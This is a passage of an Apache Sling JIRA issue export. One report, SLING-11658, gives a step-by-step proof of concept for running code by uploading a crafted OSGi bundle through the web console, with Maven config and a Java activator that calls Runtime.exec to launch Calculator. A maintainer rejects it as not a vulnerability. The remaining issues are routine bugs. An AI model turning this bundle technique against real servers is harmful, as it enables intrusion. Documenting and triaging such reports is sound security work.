                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11658] sling remote code execute</title>
                <link>https://issues.apache.org/jira/browse/SLING-11658</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;h1&gt;&lt;a name=&quot;Utilizationprocess&quot;&gt;&lt;/a&gt;Utilization process&lt;/h1&gt;

&lt;p&gt;&#160;&lt;br/&gt;
After Sling logs in,Osgi management function,You can obtain host control by uploading the bundle component package.&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;image-wrap&quot; style=&quot;&quot;&gt;&lt;img src=&quot;https://issues.apache.org/jira/secure/attachment/13051690/13051690_1.png&quot; style=&quot;border: 0px solid black&quot; /&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;br/&gt;
After uploading the malicious bundle package constructed by the attacker,First click the &quot;Refresh Package Imports&quot; button, and then click the &quot;start&quot; button,This will trigger the bundle group price loading, and the malicious code will be executed.&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;image-wrap&quot; style=&quot;&quot;&gt;&lt;img src=&quot;https://issues.apache.org/jira/secure/attachment/13051689/13051689_2.png&quot; style=&quot;border: 0px solid black&quot; /&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;
&lt;h1&gt;&lt;a name=&quot;Jarpackageconstruction%3A&quot;&gt;&lt;/a&gt;Jar package construction:&lt;/h1&gt;

&lt;p&gt;&#160;&lt;br/&gt;
Create a new Maven project and add the following compilation options in pom.xml:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&#160; &#160;&amp;lt;build&amp;gt;
&#160; &#160; &#160; &#160; &amp;lt;plugins&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;plugin&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;groupId&amp;gt;org.apache.maven.plugins&amp;lt;/groupId&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;artifactId&amp;gt;maven-assembly-plugin&amp;lt;/artifactId&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;configuration&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;descriptorRefs&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;descriptorRef&amp;gt;jar-with-dependencies&amp;lt;/descriptorRef&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;/descriptorRefs&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;archive&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;manifestEntries&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;Bundle-SymbolicName&amp;gt;shxjia&amp;lt;/Bundle-SymbolicName&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;Bundle-Activator&amp;gt;jsx.ink.Main&amp;lt;/Bundle-Activator&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;Bundle-Version&amp;gt;6.6.6&amp;lt;/Bundle-Version&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;/manifestEntries&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;/archive&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;/configuration&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;/plugin&amp;gt;
&#160; &#160; &#160; &#160; &amp;lt;/plugins&amp;gt;
&#160; &#160; &amp;lt;/build&amp;gt; &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Create Main.java in the source code folder:&lt;/p&gt;

&lt;p&gt;Note the &quot;package jsx. ink;&quot; in the source code It should correspond to the Bundle Activator attribute in pom.xml.&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;package&lt;/span&gt; jsx.ink;
&lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;class &lt;/span&gt;Main {
&#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;static&lt;/span&gt; {
&#160; &#160; &#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;try&lt;/span&gt; {
&#160; &#160; &#160; &#160; &#160; &#160; &lt;span class=&quot;code-object&quot;&gt;Runtime&lt;/span&gt;.getRuntime().exec(&lt;span class=&quot;code-quote&quot;&gt;&quot;/&lt;span class=&quot;code-object&quot;&gt;System&lt;/span&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;&lt;/span&gt;);
&#160; &#160; &#160; &#160; } &lt;span class=&quot;code-keyword&quot;&gt;catch&lt;/span&gt; (Exception e) {
&#160; &#160; &#160; &#160; }
&#160; &#160; }
&#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;static&lt;/span&gt; void main(&lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt;[] args) {&#160; &#160; &#160; &#160; &lt;span class=&quot;code-object&quot;&gt;System&lt;/span&gt;.out.println(&lt;span class=&quot;code-quote&quot;&gt;&quot;Hello world!&quot;&lt;/span&gt;);
&#160; &#160; }
} &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After the code is written, enter the directory where pom.xml is located and use the maven command to package:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
mvn assembly:assembly -f pom.xml &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;h1&gt;&lt;a name=&quot;%C2%A0&quot;&gt;&lt;/a&gt;&#160;&lt;/h1&gt;
&lt;h1&gt;&lt;a name=&quot;Repair&quot;&gt;&lt;/a&gt;Repair&lt;/h1&gt;
&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;You can use securityManager to restrict some operations.&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&#160;&lt;span class=&quot;code-object&quot;&gt;SecurityManager&lt;/span&gt; securityManager = &lt;span class=&quot;code-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;code-object&quot;&gt;SecurityManager&lt;/span&gt;() {
&#160; &#160; &#160; &#160; &#160; &#160; @Override
&#160; &#160; &#160; &#160; &#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; void checkExec(&lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt; cmd) {
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; List&amp;lt;&lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt;&amp;gt; whiteList = Arrays.asList(&lt;span class=&quot;code-quote&quot;&gt;&quot;whoami,netstat&quot;&lt;/span&gt;);&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;if&lt;/span&gt; (!whiteList.contains(cmd)) {
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;code-keyword&quot;&gt;new&lt;/span&gt; RuntimeException(&lt;span class=&quot;code-quote&quot;&gt;&quot;command execute denied!&quot;&lt;/span&gt;);
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; }
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &lt;span class=&quot;code-keyword&quot;&gt;super&lt;/span&gt;.checkExec(cmd);
&#160; &#160; &#160; &#160; &#160; &#160; }
&#160; &#160; &#160; &#160; };
&#160; &#160; &#160; &#160; &lt;span class=&quot;code-object&quot;&gt;System&lt;/span&gt;.setSecurityManager(securityManager); &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment>OpenJDK Runtime Environment (Zulu 8.64.0.19-CA-macos-aarch64) (build 1.8.0_345-b01)</environment>
        <key id="13494208">SLING-11658</key>
            <summary>sling remote code execute</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="6">Invalid</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="QSecTeam">QSec-Team</reporter>
                        <labels>
                    </labels>
                <created>Wed, 2 Nov 2022 02:57:29 +0000</created>
                <updated>Wed, 2 Nov 2022 12:52:35 +0000</updated>
                            <resolved>Wed, 2 Nov 2022 10:06:42 +0000</resolved>
                                    <version>App CMS 1.1.2</version>
                                                    <component>Console</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17627432" author="JIRAUSER297059" created="Wed, 2 Nov 2022 02:59:11 +0000"  >&lt;p&gt;/org/apache/felix/org.apache.felix.webconsole/4.7.0/org.apache.felix.webconsole-4.7.0.jar!/org/apache/felix/webconsole/internal/core/BundlesServlet.class&lt;/p&gt;</comment>
                            <comment id="17627584" author="rombert" created="Wed, 2 Nov 2022 10:06:42 +0000"  >&lt;p&gt;Thank you for your report. In the future, please report security issues at security@sling.apache.org, following the process at &lt;a href=&quot;https://sling.apache.org/project-information/security.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://sling.apache.org/project-information/security.html&lt;/a&gt; .&lt;/p&gt;

&lt;p&gt;We do not consider this to be a security issue, as accessing the web console already grants administrative privileges to all of Sling.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                            <attachment id="13051690" name="1.png" size="106009" author="QSecTeam" created="Wed, 2 Nov 2022 02:53:51 +0000"/>
                            <attachment id="13051689" name="2.png" size="80395" author="QSecTeam" created="Wed, 2 Nov 2022 02:54:27 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>2.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 51 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1apxk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11653] DefaultAclManager.calculateEnforcedIntermediatePath fails for supported ancestor</title>
                <link>https://issues.apache.org/jira/browse/SLING-11653</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;&lt;tt&gt;DefaultAclManager.calculateEnforcedIntermediatePath&lt;/tt&gt; does not cover the case where the passed intermediate path is a valid ancestor of the configured &lt;tt&gt;enforcePrincipalBasedSupportedPath&lt;/tt&gt;.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13491904">SLING-11653</key>
            <summary>DefaultAclManager.calculateEnforcedIntermediatePath fails for supported ancestor</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="angela">Angela Schreiber</assignee>
                                    <reporter username="angela">Angela Schreiber</reporter>
                        <labels>
                    </labels>
                <created>Wed, 26 Oct 2022 16:23:36 +0000</created>
                <updated>Mon, 31 Oct 2022 12:27:15 +0000</updated>
                            <resolved>Thu, 27 Oct 2022 12:32:50 +0000</resolved>
                                    <version>Content-Package to Feature Model Converter 1.1.20</version>
                                    <fixVersion>Content-Package to Feature Model Converter 1.1.22</fixVersion>
                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>0</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1abrc:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11651] Some EPS MimeTypes not Resolvable to Extension</title>
                <link>https://issues.apache.org/jira/browse/SLING-11651</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Certain systems (such as Adobe&apos;s Dynamic Media) produce EPS documents with the mimetype: image/x-eps which is not in the Common MIME&apos;s list of supported mime types:&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-commons-mime/tree/master/src/main/resources/META-INF&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-commons-mime/tree/master/src/main/resources/META-INF&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;Thus, when attempting to retrieve the extension for a resource with the mime type image/x-eps, null is returned instead of the expected extension.&lt;/p&gt;

&lt;p&gt;We should update Commons MIME to support all common mime type variants for EPS files:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Encapsulated_PostScript&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://en.wikipedia.org/wiki/Encapsulated_PostScript&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13491349">SLING-11651</key>
            <summary>Some EPS MimeTypes not Resolvable to Extension</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="10011">Won&apos;t Do</resolution>
                                        <assignee username="dklco">Dan Klco</assignee>
                                    <reporter username="dklco">Dan Klco</reporter>
                        <labels>
                    </labels>
                <created>Tue, 25 Oct 2022 17:45:02 +0000</created>
                <updated>Thu, 5 Oct 2023 18:24:43 +0000</updated>
                            <resolved>Mon, 14 Nov 2022 18:31:08 +0000</resolved>
                                    <version>Commons MIME 2.2.2</version>
                                                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="12000">3h 20m</timespent>
                                <comments>
                            <comment id="17623962" author="dklco" created="Tue, 25 Oct 2022 18:01:08 +0000"  >&lt;p&gt;PR opened: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-commons-mime/pull/4&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-commons-mime/pull/4&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1a8c8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11649] Check for null BundleContext while registering bundle resources</title>
                <link>https://issues.apache.org/jira/browse/SLING-11649</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;While registering bundle resources the BundleContext may be null in some circumstances.&lt;/p&gt;

&lt;p&gt;I have encountered this stack trace:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;java.lang.NullPointerException: null
&#160; &#160; at org.apache.sling.bundleresource.impl.BundleResourceProvider.registerService(BundleResourceProvider.java:69) [org.apache.sling.bundleresource.impl:2.3.4]
&#160; &#160; at org.apache.sling.bundleresource.impl.Activator.addBundleResourceProvider(Activator.java:142) [org.apache.sling.bundleresource.impl:2.3.4]
&#160; &#160; at org.apache.sling.bundleresource.impl.Activator.bundleChanged(Activator.java:99) [org.apache.sling.bundleresource.impl:2.3.4]
&#160; &#160; at org.apache.felix.framework.EventDispatcher.invokeBundleListenerCallback(EventDispatcher.java:915)
&#160; &#160; at org.apache.felix.framework.EventDispatcher.fireEventImmediately(EventDispatcher.java:834)
&#160; &#160; at org.apache.felix.framework.EventDispatcher.run(EventDispatcher.java:1147)
&#160; &#160; at org.apache.felix.framework.EventDispatcher.access$000(EventDispatcher.java:54)
&#160; &#160; at org.apache.felix.framework.EventDispatcher$1.run(EventDispatcher.java:102)
&#160; &#160; at java.base/java.lang.Thread.run(Thread.java:829)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Expected:&lt;/p&gt;

&lt;p&gt;Check for null BundleContext before using it and report a more meaningful error message if null.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13489563">SLING-11649</key>
            <summary>Check for null BundleContext while registering bundle resources</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="enorman">Eric Norman</assignee>
                                    <reporter username="enorman">Eric Norman</reporter>
                        <labels>
                    </labels>
                <created>Sun, 23 Oct 2022 19:46:23 +0000</created>
                <updated>Wed, 12 Mar 2025 12:06:32 +0000</updated>
                            <resolved>Thu, 27 Oct 2022 22:43:48 +0000</resolved>
                                                    <fixVersion>Bundle Resource Provider 2.4.0</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="2400">40m</timespent>
                                <comments>
                            <comment id="17622878" author="enorman" created="Sun, 23 Oct 2022 20:33:17 +0000"  >&lt;p&gt;PR #2 contains the proposed changes for review and feedback&lt;/p&gt;</comment>
                            <comment id="17625351" author="enorman" created="Thu, 27 Oct 2022 22:43:48 +0000"  >&lt;p&gt;Merged PR at: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-bundleresource-impl/commit/993e5a891e35cc0e2de10811068b069e2b3e82dc&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;&lt;tt&gt;993e5a8&lt;/tt&gt;&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 51 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z19xbk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11631] The server ready waitForQuietPeriod pause should only happen once</title>
                <link>https://issues.apache.org/jira/browse/SLING-11631</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When specifying a value for the &quot;server.ready.quiet.period.seconds&quot; system property it is expected to pause for that duration once after the server is ready.&lt;/p&gt;

